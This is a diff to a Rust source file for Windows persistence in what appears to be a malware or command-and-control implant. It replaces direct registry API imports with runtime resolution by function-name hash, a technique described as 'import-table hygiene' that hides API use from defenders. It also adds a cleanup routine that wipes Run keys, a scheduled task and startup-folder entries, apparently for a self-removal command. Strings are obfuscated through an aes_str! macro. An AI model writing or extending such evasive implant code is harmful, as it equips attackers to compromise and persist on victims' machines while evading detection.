@@ -2,7 +2,6 @@
 //
 // Windows persistence implementations.
 //
-// Registry operations use raw Win32 via extern "system" - no extra crates,
 // consistent with the pattern in migrate.rs and injection/windows/.
 //
 // Scheduled tasks use the COM ITaskService API (windows crate) to avoid
@@ -33,59 +32,75 @@ const ERROR_SUCCESS: i32 = 0;
 const ERROR_FILE_NOT_FOUND: i32 = 2;
 const MAX_PATH: usize = 260;
 
-extern "system" {
-    fn RegCreateKeyExW(
-        hKey: isize,
-        lpSubKey: *const u16,
-        Reserved: u32,
-        lpClass: *const u16,
-        dwOptions: u32,
-        samDesired: u32,
-        lpSecurityAttributes: *const u8,
-        phkResult: *mut isize,
-        lpdwDisposition: *mut u32,
-    ) -> i32;
-
-    fn RegOpenKeyExW(
-        hKey: isize,
-        lpSubKey: *const u16,
-        ulOptions: u32,
-        samDesired: u32,
-        phkResult: *mut isize,
-    ) -> i32;
-
-    fn RegSetValueExW(
-        hKey: isize,
-        lpValueName: *const u16,
-        Reserved: u32,
-        dwType: u32,
-        lpData: *const u8,
-        cbData: u32,
-    ) -> i32;
-
-    fn RegDeleteValueW(hKey: isize, lpValueName: *const u16) -> i32;
-
-    fn RegQueryValueExW(
-        hKey: isize,
-        lpValueName: *const u16,
-        lpReserved: *const u32,
-        lpType: *mut u32,
-        lpData: *mut u8,
-        lpcbData: *mut u32,
-    ) -> i32;
-
-    fn RegEnumValueW(
-        hKey: isize,
-        dwIndex: u32,
-        lpValueName: *mut u16,
-        lpcchValueName: *mut u32,
-        lpReserved: *const u32,
-        lpType: *mut u32,
-        lpData: *mut u8,
-        lpcbData: *mut u32,
-    ) -> i32;
-
-    fn RegCloseKey(hKey: isize) -> i32;
+/// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
+unsafe fn RegCreateKeyExW( hKey: isize, lpSubKey: *const u16, Reserved: u32, lpClass: *const u16, dwOptions: u32, samDesired: u32, lpSecurityAttributes: *const u8, phkResult: *mut isize, lpdwDisposition: *mut u32, ) -> i32 {
+    type F = unsafe extern "system" fn(isize, *const u16, u32, *const u16, u32, u32, *const u8, *mut isize, *mut u32) -> i32;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegCreateKeyExW")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hKey, lpSubKey, Reserved, lpClass, dwOptions, samDesired, lpSecurityAttributes, phkResult, lpdwDisposition) }
+}
+/// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
+unsafe fn RegOpenKeyExW( hKey: isize, lpSubKey: *const u16, ulOptions: u32, samDesired: u32, phkResult: *mut isize, ) -> i32 {
+    type F = unsafe extern "system" fn(isize, *const u16, u32, u32, *mut isize) -> i32;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegOpenKeyExW")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hKey, lpSubKey, ulOptions, samDesired, phkResult) }
+}
+/// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
+unsafe fn RegSetValueExW( hKey: isize, lpValueName: *const u16, Reserved: u32, dwType: u32, lpData: *const u8, cbData: u32, ) -> i32 {
+    type F = unsafe extern "system" fn(isize, *const u16, u32, u32, *const u8, u32) -> i32;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegSetValueExW")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hKey, lpValueName, Reserved, dwType, lpData, cbData) }
+}
+/// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
+unsafe fn RegDeleteValueW(hKey: isize, lpValueName: *const u16) -> i32 {
+    type F = unsafe extern "system" fn(isize, *const u16) -> i32;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegDeleteValueW")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hKey, lpValueName) }
+}
+/// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
+unsafe fn RegQueryValueExW( hKey: isize, lpValueName: *const u16, lpReserved: *const u32, lpType: *mut u32, lpData: *mut u8, lpcbData: *mut u32, ) -> i32 {
+    type F = unsafe extern "system" fn(isize, *const u16, *const u32, *mut u32, *mut u8, *mut u32) -> i32;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegQueryValueExW")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData) }
+}
+/// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
+unsafe fn RegEnumValueW( hKey: isize, dwIndex: u32, lpValueName: *mut u16, lpcchValueName: *mut u32, lpReserved: *const u32, lpType: *mut u32, lpData: *mut u8, lpcbData: *mut u32, ) -> i32 {
+    type F = unsafe extern "system" fn(isize, u32, *mut u16, *mut u32, *const u32, *mut u32, *mut u8, *mut u32) -> i32;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegEnumValueW")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hKey, dwIndex, lpValueName, lpcchValueName, lpReserved, lpType, lpData, lpcbData) }
+}
+/// Lazily resolved from advapi32.dll by name hash (import-table hygiene).
+unsafe fn RegCloseKey(hKey: isize) -> i32 {
+    type F = unsafe extern "system" fn(isize) -> i32;
+    static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+    let p = *P.get_or_init(||
+        crate::agent::injection::win_resolve::resolve_ptr(
+            b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"RegCloseKey")));
+    let f: F = unsafe { std::mem::transmute(p) };
+    unsafe { f(hKey) }
 }
 
 fn to_wide(s: &str) -> Vec<u16> {
@@ -461,6 +476,77 @@ pub fn remove_startup(file_name: &str) -> Result<String, String> {
         .map_err(|e| format!("{}: {}", aes_str!("Remove startup file failed"), e))?;
 
     Ok(format!("{} '{}' {}", aes_str!("[+] Removed"), dst.display(), aes_str!("from startup folder")))
+}
+
+// ── Full cleanup (persist:cleanup / sys:die) ──────────────────────────
+//
+// Removes every persistence artifact this install may have created,
+// keyed by the agent's label: the file stem of the running binary (when
+// the agent runs from its stable drop, the label IS the install name).
+// Each method is attempted independently - a failure (e.g. HKLM access
+// denied when not elevated) is reported but never aborts the others.
+
+/// Stable-drop path for the currently running binary, computed exactly
+/// the way stable_drop() does - but without copying anything.
+pub fn stable_path_for_current_exe() -> Option<String> {
+    let exe = std::env::current_exe().ok()?;
+    let name = exe.file_name()?.to_string_lossy().into_owned();
+    let appdata = std::env::var(aes_str!("APPDATA")).ok()?;
+    Some(format!("{}{}{}", appdata, aes_str!("\\Microsoft\\"), name))
+}
+
+/// Map a remove_* result onto a per-method status line.
+fn classify(method: &str, r: Result<String, String>) -> String {
+    match r {
+        Ok(m) => format!("{}: removed ({})", method, m),
+        Err(e) => {
+            let l = e.to_lowercase();
+            if l.contains("not found") || l.contains("cannot find") || l.contains("os error 2") {
+                format!("{}: not-present", method)
+            } else {
+                format!("{}: failed ({})", method, e)
+            }
+        }
+    }
+}
+
+pub fn cleanup_all() -> String {
+    let exe = std::env::current_exe()
+        .map(|p| p.to_string_lossy().into_owned())
+        .unwrap_or_default();
+    let label = std::path::Path::new(&exe)
+        .file_stem()
+        .map(|n| n.to_string_lossy().into_owned())
+        .unwrap_or_default();
+    let file_name = std::path::Path::new(&exe)
+        .file_name()
+        .map(|n| n.to_string_lossy().into_owned())
+        .unwrap_or_default();
+    let stable = stable_path_for_current_exe().unwrap_or_default();
+
+    let mut report = vec![format!(
+        "{} (label: {}, stable: {})",
+        aes_str!("[*] Persistence cleanup"), label, stable
+    )];
+
+    // T1547.001 - Run keys. HKLM removal failing when not elevated is
+    // reported inline and does NOT abort the remaining methods.
+    report.push(classify(&aes_str!("run_hkcu"), remove_run(&label, false)));
+    report.push(classify(&aes_str!("run_hklm"), remove_run(&label, true)));
+
+    // T1053.005 - Scheduled task
+    report.push(classify(&aes_str!("task"), remove_task(&label)));
+
+    // T1547.009 - Startup folder: direct binary copy (<file_name>) and
+    // shortcut form (<label>.lnk)
+    report.push(classify(&aes_str!("startup"), remove_startup(&file_name)));
+    report.push(classify(
+        &aes_str!("startup_lnk"),
+        remove_startup(&format!("{}{}", label, aes_str!(".lnk"))),
+    ));
+
+    report.push(aes_str!("[+] Cleanup complete"));
+    report.join("\n")
 }
 
 // ── Inventory ─────────────────────────────────────────────────────────
